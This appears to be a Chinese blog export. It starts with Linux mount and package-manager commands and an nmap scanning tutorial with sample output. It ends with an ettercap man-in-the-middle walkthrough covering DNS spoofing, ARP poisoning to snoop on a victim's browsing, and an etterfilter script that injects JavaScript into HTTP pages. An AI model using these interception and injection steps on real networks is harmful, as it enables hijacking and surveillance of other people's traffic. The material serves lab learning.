<p>mount 命令用于将文件系统挂载到指定的挂载点。<br>用法：<br>mount [选项] 设备 挂载点<br>常用选项：<br>-t 类型：指定文件系统类型。<br>-o 选项：指定挂载选项（如只读、用户、绑定等）。<br>示例：<br># 将设备 &#x2F;dev&#x2F;sda1 挂载到 &#x2F;mnt 目录<br>mount &#x2F;dev&#x2F;sda1 &#x2F;mnt</p>
<p># 挂载 ext4 文件系统<br>mount -t ext4 &#x2F;dev&#x2F;sda1 &#x2F;mnt</p>
<p># 以只读模式挂载<br>mount -o ro &#x2F;dev&#x2F;sda1 &#x2F;mnt<br>▐ umount：卸载文件系统</p>
<p>umount 命令用于卸载已挂载的文件系统。<br>用法：<br>umount [选项] 挂载点或设备<br>常用选项：<br>-f：强制卸载。<br>-l：延迟卸载。<br>示例：<br># 卸载 &#x2F;mnt 挂载点上的文件系统<br>umount &#x2F;mnt</p>
<p># 强制卸载 &#x2F;mnt<br>umount -f &#x2F;mnt</p>
<p># 延迟卸载 &#x2F;mnt<br>umount -l &#x2F;mnt</p>
<h1 id="九-程序安装和包管理命令-1"><a href="#九-程序安装和包管理命令-1" class="headerlink" title="九.程序安装和包管理命令"></a>九.程序安装和包管理命令</h1><p>在Linux中，程序安装和包管理命令用于安装、更新、卸载和管理软件包。不同的Linux发行版使用不同的包管理工具和命令，下面是常见的包管理命令及其详细信息：<br>在Linux中，程序安装和包管理命令主要分为以下三个角度：<br>apt-get&#x2F;apt：Debian系发行版的软件包管理工具<br>yum&#x2F;dnf：Red Hat系发行版的软件包管理工具<br>rpm：Red Hat Package Manager，用于安装、卸载和管理RPM包</p>
<h2 id="▐-1-apt-get-apt：Debian系发行版的软件包管理工具"><a href="#▐-1-apt-get-apt：Debian系发行版的软件包管理工具" class="headerlink" title="▐ 1. apt-get&#x2F;apt：Debian系发行版的软件包管理工具"></a>▐ 1. apt-get&#x2F;apt：Debian系发行版的软件包管理工具</h2><p>这些工具主要用于基于Debian的发行版，包括但不限于以下操作系统：<br>Debian：原始的Debian发行版。<br>Ubuntu：最流行的基于Debian的发行版，包括其各种官方衍生版，如Kubuntu、Lubuntu、Xubuntu等。<br>Linux Mint：基于Ubuntu的发行版，提供更友好的用户界面。<br>Elementary OS：基于Ubuntu的发行版，注重美观和简洁。<br>Kali Linux：基于Debian的发行版，专注于安全测试和数字取证。<br>Raspbian：为Raspberry Pi优化的Debian发行版。<br>apt-get 和 apt 是Debian系和Ubuntu系发行版中最常用的包管理工具。<br>apt-get</p>
<p>apt-get 是高级包管理工具，适用于命令行环境，用于处理软件包的安装、升级、删除等操作。<br>常用命令：<br>update：更新包列表。<br>upgrade：升级所有已安装的软件包。<br>install：安装新软件包。<br>remove：卸载软件包。<br>autoremove：自动卸载不再需要的软件包。<br>clean：清理下载的包文件。<br>dist-upgrade：进行发行版升级。<br>示例：<br># 更新包列表<br>sudo apt-get update</p>
<p># 升级所有已安装的软件包<br>sudo apt-get upgrade</p>
<p># 安装新软件包<br>sudo apt-get install package_name</p>
<p># 卸载软件包<br>sudo apt-get remove package_name</p>
<p># 自动卸载不再需要的软件包<br>sudo apt-get autoremove</p>
<p># 清理下载的包文件<br>sudo apt-get clean</p>
<p># 进行发行版升级<br>sudo apt-get dist-upgrade<br>apt</p>
<p>apt 命令是 apt-get 的简化版，提供了更友好的用户界面，更易于使用。<br>常用命令：<br>update：更新包列表。<br>upgrade：升级所有已安装的软件包。<br>install：安装新软件包。<br>remove：卸载软件包。<br>autoremove：自动卸载不再需要的软件包。<br>search：搜索软件包。<br>show：显示软件包信息。<br>示例：<br># 更新包列表<br>sudo apt update</p>
<p># 升级所有已安装的软件包<br>sudo apt upgrade</p>
<p># 安装新软件包<br>sudo apt install package_name</p>
<p># 卸载软件包<br>sudo apt remove package_name</p>
<p># 自动卸载不再需要的软件包<br>sudo apt autoremove</p>
<p># 搜索软件包<br>apt search package_name</p>
<p># 显示软件包信息<br>apt show package_name</p>
<h2 id="▐-2-yum-dnf：Red-Hat系发行版的软件包管理工具"><a href="#▐-2-yum-dnf：Red-Hat系发行版的软件包管理工具" class="headerlink" title="▐ 2. yum&#x2F;dnf：Red Hat系发行版的软件包管理工具"></a>▐ 2. yum&#x2F;dnf：Red Hat系发行版的软件包管理工具</h2><p>这些工具主要用于基于Red Hat的发行版，包括但不限于以下操作系统：<br>Red Hat Enterprise Linux (RHEL)：商业支持的企业级发行版。<br>CentOS：RHEL的社区版，提供免费使用的RHEL功能。<br>Fedora：由Red Hat支持的社区版，常作为RHEL的新功能测试平台。<br>Oracle Linux：基于RHEL的发行版，提供Oracle支持。<br>AlmaLinux：社区驱动的RHEL替代品，主要用于服务器环境。<br>Rocky Linux：由CentOS创始人Gregory Kurtzer发起的RHEL替代品。<br>yum</p>
<p>yum 是Red Hat系和CentOS系发行版中常用的包管理工具，支持自动解决软件包依赖性问题。<br>常用命令：<br>check-update：检查可用更新。<br>update：升级所有已安装的软件包。<br>install：安装新软件包。<br>remove：卸载软件包。<br>clean：清理缓存。<br>list：列出软件包。<br>示例：<br># 检查可用更新<br>sudo yum check-update</p>
<p># 升级所有已安装的软件包<br>sudo yum update</p>
<p># 安装新软件包<br>sudo yum install package_name</p>
<p># 卸载软件包<br>sudo yum remove package_name</p>
<p># 清理缓存<br>sudo yum clean all</p>
<p># 列出所有已安装和可用的软件包<br>yum list<br>dnf</p>
<p>dnf 是 yum 的下一代版本，提供了改进的性能和更多功能。<br>常用命令：<br>check-update：检查可用更新。<br>upgrade：升级所有已安装的软件包。<br>install：安装新软件包。<br>remove：卸载软件包。<br>clean：清理缓存。<br>list：列出软件包。<br>示例：<br># 检查可用更新<br>sudo dnf check-update</p>
<p># 升级所有已安装的软件包<br>sudo dnf upgrade</p>
<p># 安装新软件包<br>sudo dnf install package_name</p>
<p># 卸载软件包<br>sudo dnf remove package_name</p>
<p># 清理缓存<br>sudo dnf clean all</p>
<p># 列出所有已安装和可用的软件包<br>dnf list</p>
<h2 id="▐-3-rpm：Red-Hat-Package-Manager，用于安装、卸载和管理RPM包"><a href="#▐-3-rpm：Red-Hat-Package-Manager，用于安装、卸载和管理RPM包" class="headerlink" title="▐ 3. rpm：Red Hat Package Manager，用于安装、卸载和管理RPM包"></a>▐ 3. rpm：Red Hat Package Manager，用于安装、卸载和管理RPM包</h2><p>RPM包管理器最初由Red Hat开发，现在广泛用于许多基于RPM的发行版，包括但不限于以下操作系统：<br>Red Hat Enterprise Linux (RHEL)：使用rpm作为其基础包管理工具。<br>CentOS：使用rpm来管理软件包。<br>Fedora：使用rpm作为其底层包管理工具。<br>SUSE Linux Enterprise：SUSE的企业级发行版，使用rpm包管理器。<br>openSUSE：SUSE的社区版，使用rpm来管理软件包。<br>Oracle Linux：基于RHEL的发行版，使用rpm包管理器。<br>Mageia：基于Mandriva Linux的社区发行版，使用rpm包管理器。<br>PCLinuxOS：基于Mandriva的独立发行版，使用rpm包管理器。<br>rpm 是Red Hat Package Manager的缩写，用于管理RPM包。适用于Red Hat系发行版以及使用RPM包的其他发行版，如Fedora、CentOS等。<br>常用命令：<br>-i：安装软件包。<br>-e：卸载软件包。<br>-U：升级软件包。<br>-q：查询软件包。<br>示例：<br># 安装RPM软件包<br>sudo rpm -i package_file.rpm</p>
<p># 卸载RPM软件包<br>sudo rpm -e package_name</p>
<p># 升级RPM软件包<br>sudo rpm -U package_file.rpm</p>
<p># 查询已安装的软件包<br>rpm -q package_name</p>
<p># 查询所有已安装的软件包<br>rpm -qa<br>选项说明：<br>-i：安装一个新软件包。<br>-e：卸载一个已安装的软件包。<br>-U：升级一个已安装的软件包，或如果未安装则安装。<br>-q：查询软件包信息。<br>-qa：列出所有已安装的软件包。<br>查询选项：<br>-qi：显示已安装软件包的详细信息。<br>-ql：列出已安装软件包的文件列表。<br>-qc：列出已安装软件包的配置文件。<br>示例：<br># 显示已安装软件包的详细信息<br>rpm -qi package_name</p>
<p># 列出已安装软件包的文件列表<br>rpm -ql package_name</p>
<p># 列出已安装软件包的配置文件<br>rpm -qc package_name</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap命令全解析：网络探测与安全扫描的利器</title>
    <url>/posts/33f1bbdb/</url>
    <content><![CDATA[<h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><blockquote>
<p>在网络管理、安全评估以及系统运维等领域，了解网络中的主机和服务情况是至关重要的。nmap（Network Mapper）作为一款强大的网络探测和安全扫描工具，可以帮助我们实现这些目标。本文将详细介绍 nmap 命令的基本用法、常见参数及其在不同场景下的应用。</p>
</blockquote>
<h2 id="二、nmap-命令概述"><a href="#二、nmap-命令概述" class="headerlink" title="二、nmap 命令概述"></a>二、nmap 命令概述</h2><p>nmap 是一个开源的网络探测和安全审核工具，它可以快速扫描大型网络，获取主机存活状态、开放端口、服务类型、操作系统类型等重要信息。其功能强大且灵活，适用于网络管理员、安全专家以及系统管理员等各类人员。</p>
<h2 id="三、nmap-基本用法"><a href="#三、nmap-基本用法" class="headerlink" title="三、nmap 基本用法"></a>三、nmap 基本用法</h2><h3 id="（一）安装-nmap"><a href="#（一）安装-nmap" class="headerlink" title="（一）安装 nmap"></a>（一）安装 nmap</h3><p>在 Debian 或 Ubuntu 系统中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nmap</span><br></pre></td></tr></table></figure>

<p>在 CentOS 或 RHEL 系统中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum -y install nmap</span><br></pre></td></tr></table></figure>

<h3 id="（二）简单扫描示例"><a href="#（二）简单扫描示例" class="headerlink" title="（二）简单扫描示例"></a>（二）简单扫描示例</h3><ol>
<li><p>扫描单个主机<br>要扫描单个主机（例如118.24.128.50）是否存活以及开放哪些端口，可以使用以下基本命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 118.24.128.50</span><br></pre></td></tr></table></figure>

<p>扫描结果，可以看到常用端口开放状态</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-0-5-centos ~]<span class="comment"># nmap 118.24.128.50</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-16 13:21 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 118.24.128.50</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">Not shown: 997 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line">22/tcp  open   ssh</span><br><span class="line">80/tcp  open   http</span><br><span class="line">443/tcp closed https</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 4.92 seconds</span><br></pre></td></tr></table></figure>
</li>
<li><p>扫描单个主机指定端口<br>列如（例如118.24.128.50:6379）使用<code>-p</code> 指定端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 6379 118.24.128.50</span><br></pre></td></tr></table></figure>

<p>扫描结果<br>“filtered” 表示端口状态为被过滤。这意味着 nmap 无法确定端口是开放还是关闭，因为有某种防火墙、网络过滤设备（如路由器上的访问控制列表 ACL）或者其他网络安全机制在阻止 nmap 获取准确的端口状态信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-0-5-centos ~]<span class="comment"># nmap -p 6379 118.24.128.50</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-16 13:25 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 118.24.128.50</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">6379/tcp filtered redis</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.30 seconds</span><br><span class="line">[root@VM-0-5-centos ~]<span class="comment"># </span></span><br></pre></td></tr></table></figure>
</li>
<li><p>扫描一个网段<br>如果要扫描一个网段（例如192.168.1.0&#x2F;24），以查找该网段内所有存活主机及其开放端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.0/24</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="四、nmap-常见参数"><a href="#四、nmap-常见参数" class="headerlink" title="四、nmap 常见参数"></a>四、nmap 常见参数</h2><h3 id="（一）-sS（TCP-SYN-扫描）"><a href="#（一）-sS（TCP-SYN-扫描）" class="headerlink" title="（一）-sS（TCP SYN 扫描）"></a>（一）-sS（TCP SYN 扫描）</h3><p>这是 nmap 默认的扫描方式之一，也被称为半开放扫描。它发送一个 SYN 包到目标端口，如果收到 SYN - ACK 响应，则表示端口开放；如果收到 RST 包，则表示端口关闭。这种扫描方式比较隐蔽，因为它不会建立完整的 TCP 连接。<br>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.1.100</span><br></pre></td></tr></table></figure>

<h3 id="（二）-sT（TCP-连接扫描）"><a href="#（二）-sT（TCP-连接扫描）" class="headerlink" title="（二）-sT（TCP 连接扫描）"></a>（二）-sT（TCP 连接扫描）</h3><p>这种扫描方式会建立完整的 TCP 连接，就像正常的客户端连接服务器一样。虽然这种方式更容易被目标系统检测到，但在某些情况下可能更准确。<br>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sT 192.168.1.100</span><br></pre></td></tr></table></figure>

<h3 id="（三）-sU（UDP-扫描）"><a href="#（三）-sU（UDP-扫描）" class="headerlink" title="（三）-sU（UDP 扫描）"></a>（三）-sU（UDP 扫描）</h3><p>用于扫描目标主机上的 UDP 端口。UDP 扫描相对比较困难，因为 UDP 协议本身无连接，不像 TCP 那样有明确的响应机制。nmap 会发送 UDP 数据包到目标端口，如果端口关闭，可能会收到 ICMP 端口不可达消息。<br>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sU 192.168.1.100</span><br></pre></td></tr></table></figure>

<h3 id="（四）-p（指定端口）"><a href="#（四）-p（指定端口）" class="headerlink" title="（四）-p（指定端口）"></a>（四）-p（指定端口）</h3><p>如果不想扫描所有端口，可以使用-p参数指定要扫描的端口或端口范围。<br>扫描单个端口<br>例如，只扫描目标主机的 80 端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 80 192.168.1.100</span><br></pre></td></tr></table></figure>

<p>扫描多个端口<br>可以用逗号分隔多个端口号，如扫描 80、443 和 22 端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 80,443,22 192.168.1.100</span><br></pre></td></tr></table></figure>

<p>扫描端口范围<br>扫描 1 - 100 端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 1 - 100 192.168.1.100</span><br></pre></td></tr></table></figure>

<h3 id="（五）-O（操作系统检测）"><a href="#（五）-O（操作系统检测）" class="headerlink" title="（五）-O（操作系统检测）"></a>（五）-O（操作系统检测）</h3><p>nmap 可以尝试检测目标主机的操作系统类型。虽然这种检测并不是 100% 准确，但在大多数情况下能够提供有用的参考。<br>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -O 192.168.1.100</span><br></pre></td></tr></table></figure>

<h3 id="（六）-A（全面扫描）"><a href="#（六）-A（全面扫描）" class="headerlink" title="（六）-A（全面扫描）"></a>（六）-A（全面扫描）</h3><p>-A参数相当于同时启用了操作系统检测（-O）、脚本扫描（-sC）和全面的端口扫描。这是一种综合扫描方式，可以获取关于目标主机的丰富信息。<br>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.1.100</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-0-5-centos ~]<span class="comment"># nmap -A 192.168.1.100</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-16 13:37 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.100</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">Not shown: 997 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22/tcp  open   ssh     OpenSSH 8.7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 a4:cf:66:1c:bd:71:c9:<span class="built_in">df</span>:e6:eb:13:88:62:3b:7a:ff (ECDSA)</span><br><span class="line">|_  256 5a:86:eb:9a:3d:88:7e:9a:46:c0:31:8f:82:13:ed:f2 (ED25519)</span><br><span class="line">80/tcp  open   http    nginx 1.26.2</span><br><span class="line">|_http-server-header: nginx/1.26.2</span><br><span class="line">|_http-title: Boot Admin</span><br><span class="line">443/tcp closed https</span><br><span class="line">Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Linux 5.0 (90%), Linux 5.1 (90%), Ubiquiti AirOS 5.5.9 (90%), Linux 5.0 - 5.4 (89%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 443/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.44 ms 30.65.72.193</span><br><span class="line">2   0.25 ms 192.168.1.100</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.47 seconds</span><br></pre></td></tr></table></figure>

<h2 id="六、nmap-在网络安全中的应用"><a href="#六、nmap-在网络安全中的应用" class="headerlink" title="六、nmap 在网络安全中的应用"></a>六、nmap 在网络安全中的应用</h2><h3 id="（一）网络漏洞发现"><a href="#（一）网络漏洞发现" class="headerlink" title="（一）网络漏洞发现"></a>（一）网络漏洞发现</h3><p>通过扫描目标网络中的主机开放端口和服务，并结合脚本扫描，可以发现一些潜在的安全漏洞。例如，发现 Web 服务器上存在的未授权访问漏洞、数据库服务的弱密码等。</p>
<h3 id="（二）网络安全评估"><a href="#（二）网络安全评估" class="headerlink" title="（二）网络安全评估"></a>（二）网络安全评估</h3><p>对网络中的主机和服务进行全面扫描，包括操作系统检测、端口扫描和漏洞扫描等，可以为网络安全评估提供数据支持。根据扫描结果，可以确定网络的安全状况，采取相应的安全措施，如加固系统、修复漏洞等。</p>
<h3 id="（三）入侵检测辅助"><a href="#（三）入侵检测辅助" class="headerlink" title="（三）入侵检测辅助"></a>（三）入侵检测辅助</h3><p>nmap 的扫描结果可以作为入侵检测系统（IDS）的辅助信息。通过定期扫描网络，对比扫描结果的变化，可以发现<a href="https://marketing.csdn.net/p/3127db09a98e0723b83b2914d9256174?pId=2782&utm_source=glcblog&spm=1001.2101.3001.7020">异常</a>的主机或端口开放情况，从而及时发现潜在的入侵行为。</p>
<h2 id="八、结论"><a href="#八、结论" class="headerlink" title="八、结论"></a>八、结论</h2><p>telnet 和 nmap区别</p>
<p><code>Telnet</code>：是一种用于远程登录的应用层协议，主要功能是让用户在本地计算机上通过网络连接到远程主机，并在远程主机上进行操作，就像在本地操作一样。它使用户可以在远程主机上执行命令、访问文件、运行程序等。例如，用户可以使用 Telnet 连接到远程服务器的命令行界面，进行系统管理、文件传输等操作。<br>操作相对简单，用户只需要在命令行中输入 telnet 命令加上远程主机的 IP 地址或域名，就可以尝试连接到远程主机。如果连接成功，用户将进入远程主机的命令行界面，可以直接输入命令进行操作。但是，Telnet 的结果呈现比较简单，主要是在命令行界面上显示远程主机的命令行输出。</p>
<p><code>Nmap</code>：是一个强大的网络扫描工具，主要用于探测网络中的主机、扫描主机的开放端口、确定主机的操作系统类型以及识别网络服务等。它可以帮助网络管理员了解网络的拓扑结构、发现潜在的安全漏洞以及监测网络的运行状况。权限。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
        <category>nmap</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>ettercap中间人攻击，DNS劫持、替换网页内容与ARP欺骗</title>
    <url>/posts/215add99/</url>
    <content><![CDATA[<h2 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Ettercap是一个综合性的中间人攻击工具，使用它可以进行ARP欺骗、拦截器、DNS欺骗等常见的中间人攻击。</p>
<h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><p>1.用户界面类型<br>-T, –text 使用只显示字符的界面<br>-q, –quiet 安静模式，不显示抓到的数据包内容<br>-G, –gtk 使用GTK+ GUI，开启图形化模式</p>
<p>2.日志选项<br>-w, –write 将嗅探到的数据写入pcap文件<br>-L, –log 此处记录所有流量</p>
<p>3.通用选项<br>-i, –iface 使用该网络接口<br>-I, –liface 显示所有的网络接口<br>-P, –plugin 开始该插件<br>-F, –filter 加载过滤器 （内容过滤器）</p>
<p>4.嗅探与攻击选项<br>-M, mitm 方法:ARGS 执行mitm攻击</p>
<h2 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h2><p>修改靶机的DNS表格，使靶机访问的所有http协议的url，都指向我们设置好的IP地址。</p>
<h3 id="设置kali机"><a href="#设置kali机" class="headerlink" title="设置kali机"></a>设置kali机</h3><p>kali开启apache服务：</p>
<blockquote>
<p>service apache2 start</p>
</blockquote>
<p>浏览器访问 <a href="http://192.168.83.157/">http://192.168.83.157/</a> 会看到Apache的首页（192.168.83.157为kali的ip）。</p>
<p><img src="/img/ettercap/1.webp" alt="在这里插入图片描述"><br>编辑ettercap配置文件：</p>
<blockquote>
<p>leafpad &#x2F;etc&#x2F;ettercap&#x2F;etter.dns</p>
</blockquote>
<p><img src="/img/ettercap/2.webp" alt="在这里插入图片描述"></p>
<p>A：所有域名指向192.168.83.157（kali的IP)<br>PTR：所有地址都指向域名</p>
<h3 id="攻击靶机"><a href="#攻击靶机" class="headerlink" title="攻击靶机"></a>攻击靶机</h3><p>使用ettercap图形化界面：</p>
<blockquote>
<p>ettercap -G</p>
</blockquote>
<p>选择网络接口：<br><img src="/img/ettercap/3.webp" alt="在这里插入图片描述"><br>选择eth0</p>
<p>列举主机列表：<br><img src="/img/ettercap/4.webp" alt="在这里插入图片描述"><br>开启扫描网络，发现主机：<br><img src="/img/ettercap/5.webp" alt="在这里插入图片描述"><br>添加劫持目标：<br><img src="/img/ettercap/6.webp" alt="在这里插入图片描述"></p>
<p>target 1 放网关， target 2 放目标主机（可以是多个）。<br>target1和target2内容可以互换<br><img src="/img/ettercap/7.webp" alt="在这里插入图片描述"><br>选择DNS欺骗插件：<br><img src="/img/ettercap/8.webp" alt="在这里插入图片描述"></p>
<p>双击选择dns_spoof<br><img src="/img/ettercap/9.webp" alt="在这里插入图片描述"><br>选择攻击模块：<br><img src="/img/ettercap/10.webp" alt="在这里插入图片描述"></p>
<p><img src="/img/ettercap/11.webp" alt="在这里插入图片描述"><br>开启dns劫持攻击：<br><img src="/img/ettercap/12.webp" alt="在这里插入图片描述"></p>
<h3 id="靶机反应"><a href="#靶机反应" class="headerlink" title="靶机反应"></a>靶机反应</h3><p>靶机没有网络了：<br><img src="/img/ettercap/13.webp" alt="在这里插入图片描述"></p>
<p>这是因为靶机使用的是https的协议，是加密的</p>
<p>但是靶机访问http站点，就会跳转到<br><img src="/img/ettercap/14.webp" alt="在这里插入图片描述"></p>
<h3 id="更换靶机访问页面的内容"><a href="#更换靶机访问页面的内容" class="headerlink" title="更换靶机访问页面的内容"></a>更换靶机访问页面的内容</h3><p>如果想换成其他网站内容，需要编辑kali中的html文件：</p>
<blockquote>
<p>leafpad &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html</p>
</blockquote>
<p>换成自定义的内容，这里我尝试更改为<br><img src="/img/ettercap/15.webp" alt="在这里插入图片描述"><br>靶机再次访问http网址，就会变成：<br><img src="/img/ettercap/16.webp" alt="在这里插入图片描述"></p>
<h2 id="Ettercap替换网页内容"><a href="#Ettercap替换网页内容" class="headerlink" title="Ettercap替换网页内容"></a>Ettercap替换网页内容</h2><p>替换掉靶机访问的http网页的部分内容，可以加入一段js代码，实现我们想要的功能。</p>
<h3 id="编写过滤器"><a href="#编写过滤器" class="headerlink" title="编写过滤器"></a>编写过滤器</h3><p>编写过滤器脚本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ip.<span class="property">proto</span> == <span class="variable constant_">TCP</span> &amp;&amp; tcp.<span class="property">dst</span> == <span class="number">80</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">search</span>(<span class="variable constant_">DATA</span>.<span class="property">data</span>, <span class="string">&quot;Accept-Encoding&quot;</span>))&#123;</span><br><span class="line">        <span class="title function_">replace</span>(<span class="string">&quot;Accept-Encoding&quot;</span>, <span class="string">&quot;Accept-Nothing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ip.<span class="property">proto</span> == <span class="variable constant_">TCP</span> &amp;&amp; tcp.<span class="property">src</span> == <span class="number">80</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">search</span>(<span class="variable constant_">DATA</span>.<span class="property">data</span>, <span class="string">&quot;&lt;head&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="title function_">replace</span>(<span class="string">&quot;&lt;head&gt;&quot;</span>, <span class="string">&quot;&lt;head&gt;&lt;script&gt;alert(&#x27;hahahaha&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="title function_">msg</span>(<span class="string">&quot;inject head&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此脚本会把网页的title换成一个弹框。我们把脚本命名为head.filter</p>
<p>编译过滤器脚本：</p>
<blockquote>
<p>etterfilter head.filter -o head.ef</p>
</blockquote>
<p>会输出一个head.ef文件<br><img src="/img/ettercap/17.webp" alt="在这里插入图片描述"></p>
<h3 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h3><p>开启图形化界面</p>
<blockquote>
<p>ettercap -G</p>
</blockquote>
<p>操作和DNS劫持相同：<br>选择接口eth0<br><img src="/img/ettercap/18.webp" alt="在这里插入图片描述"><br>发现主机<br><img src="/img/ettercap/19.webp" alt="在这里插入图片描述"><br>网关添加到target1，目标添加到target2<br><img src="/img/ettercap/20.webp" alt="在这里插入图片描述"></p>
<h3 id="加载过滤器并开始攻击"><a href="#加载过滤器并开始攻击" class="headerlink" title="加载过滤器并开始攻击"></a>加载过滤器并开始攻击</h3><p>加载过滤器脚本：<br><img src="/img/ettercap/21.webp" alt="在这里插入图片描述"></p>
<p>选择我们编译过的过滤器脚本<br><img src="/img/ettercap/22.webp" alt="在这里插入图片描述"></p>
<p>选择远程攻击模块：<br><img src="/img/ettercap/23.webp" alt="在这里插入图片描述"><br><img src="/img/ettercap/24.webp" alt="在这里插入图片描述"></p>
<p>开始攻击<br><img src="/img/ettercap/25.webp" alt="在这里插入图片描述"></p>
<h3 id="靶机反应-1"><a href="#靶机反应-1" class="headerlink" title="靶机反应"></a>靶机反应</h3><p>访问http的网页就会弹窗。<br><img src="/img/ettercap/26.webp" alt="在这里插入图片描述"></p>
<h2 id="ARP劫持监控靶机访问内容"><a href="#ARP劫持监控靶机访问内容" class="headerlink" title="ARP劫持监控靶机访问内容"></a>ARP劫持监控靶机访问内容</h2><p>通过ARP欺骗，建立 靶机 –&gt; kali攻击机 –&gt; 网关 的连接。得到靶机访问的内容。</p>
<h3 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h3><p>开启图形化界面</p>
<blockquote>
<p>ettercap -G</p>
</blockquote>
<p>操作和DNS劫持相同：<br>选择接口eth0<br><img src="/img/ettercap/27.webp" alt="在这里插入图片描述"><br>发现主机<br><img src="/img/ettercap/28.webp" alt="在这里插入图片描述"><br>网关添加到target1，目标添加到target2<br><img src="/img/ettercap/29.webp" alt="在这里插入图片描述"></p>
<h3 id="加载插件并开始攻击"><a href="#加载插件并开始攻击" class="headerlink" title="加载插件并开始攻击"></a>加载插件并开始攻击</h3><p><img src="/img/ettercap/30.webp" alt="在这里插入图片描述"><br>选择remote_browsef</p>
<p>选择远程攻击模块：<br><img src="/img/ettercap/31.webp" alt="在这里插入图片描述"><br><img src="/img/ettercap/32.webp" alt="在这里插入图片描述"><br>开始攻击<br><img src="/img/ettercap/33.webp" alt="在这里插入图片描述"></p>
<h3 id="自动加载靶机图片"><a href="#自动加载靶机图片" class="headerlink" title="自动加载靶机图片"></a>自动加载靶机图片</h3><blockquote>
<p>apt-get install driftnet<br>driftnet -i eth0</p>
</blockquote>
<p>会开启一个黑窗口</p>
<h3 id="靶机反应-2"><a href="#靶机反应-2" class="headerlink" title="靶机反应"></a>靶机反应</h3><p>当靶机访问http网站的时候，kali也会自动加载这个http网站。<br>并且，driftnet会加载http的图片。</p>
